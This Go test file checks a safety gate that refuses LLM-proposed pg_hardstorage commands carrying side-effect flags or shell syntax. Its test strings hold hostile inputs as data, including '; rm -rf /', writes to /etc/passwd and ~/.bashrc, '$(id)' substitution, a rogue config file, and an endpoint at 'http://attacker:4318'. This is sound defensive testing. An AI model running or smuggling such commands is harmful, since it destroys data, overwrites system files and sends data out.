package safety_test

import (
	"strings"
	"testing"

	"github.com/cybertec-postgresql/pg_hardstorage/internal/llm/safety"
)

// TestGate_SideEffectGlobalFlagRefused: an allowlisted prefix bounds the
// subcommand, not the root persistent flags — pflag honours those
// anywhere in argv, so `pg_hardstorage doctor --cpu-profile=<path>`
// passes every prefix/mutation/preview gate yet truncates <path>.
func TestGate_SideEffectGlobalFlagRefused(t *testing.T) {
	pol := safety.SkillExecPolicy{AllowedExecutes: []string{"pg_hardstorage doctor"}}
	for _, cmd := range []string{
		"pg_hardstorage doctor --cpu-profile=/home/op/.bashrc",
		"pg_hardstorage doctor --mem-profile /tmp/x",
		"pg_hardstorage doctor --config=/tmp/evil.yaml",
		"pg_hardstorage doctor -c /tmp/evil.yaml",
		"pg_hardstorage doctor -qc/tmp/evil.yaml",
		"pg_hardstorage doctor --otel-endpoint http://attacker:4318",
		"pg_hardstorage doctor --profile-port=6060",
		"pg_hardstorage doctor --on-error-llm",
	} {
		prev := &safety.PreviewState{}
		prev.Add(cmd)
		d := safety.Gate(safety.ModeAdviseExecute, pol, prev, cmd)
		if d.Allowed {
			t.Errorf("%q: allowed, want side_effect_flag refusal", cmd)
			continue
		}
		if d.Reason != "side_effect_flag" {
			t.Errorf("%q: Reason = %q, want side_effect_flag", cmd, d.Reason)
		}
		if msg := safety.Reason(d); strings.Contains(msg, "unknown") {
			t.Errorf("%q: Reason text = %q", cmd, msg)
		}
	}
	// Ordinary read flags still pass.
	for _, cmd := range []string{
		"pg_hardstorage doctor -q",
		"pg_hardstorage doctor -o yaml",
		"pg_hardstorage doctor -ocsv",
		"pg_hardstorage doctor --no-color db1",
	} {
		prev := &safety.PreviewState{}
		prev.Add(cmd)
		if d := safety.Gate(safety.ModeAdviseExecute, pol, prev, cmd); !d.Allowed {
			t.Errorf("%q: refused (%s), want allowed", cmd, d.Reason)
		}
	}
}

// TestGate_ShellSyntaxRefused: execute_command splits on whitespace and
// execs directly — no shell.  Quotes, operators and substitutions would
// reach the child as literal argv that the command validator (which
// does shell-style tokenising) never saw the same way, so they are
// refused outright.
func TestGate_ShellSyntaxRefused(t *testing.T) {
	pol := safety.SkillExecPolicy{AllowedExecutes: []string{"pg_hardstorage doctor"}}
	for _, cmd := range []string{
		"pg_hardstorage doctor ; rm -rf /",
		"pg_hardstorage doctor | tee /etc/passwd",
		"pg_hardstorage doctor > /home/op/.bashrc",
		"pg_hardstorage doctor $(id)",
		"pg_hardstorage doctor `id`",
		`pg_hardstorage doctor "db1"`,
		"pg_hardstorage doctor db1 &",
	} {
		prev := &safety.PreviewState{}
		prev.Add(cmd)
		d := safety.Gate(safety.ModeAdviseExecute, pol, prev, cmd)
		if d.Allowed || d.Reason != "shell_syntax" {
			t.Errorf("%q: decision = %+v, want shell_syntax refusal", cmd, d)
		}
		if msg := safety.Reason(d); strings.Contains(msg, "unknown") {
			t.Errorf("%q: Reason text = %q", cmd, msg)
		}
	}
}
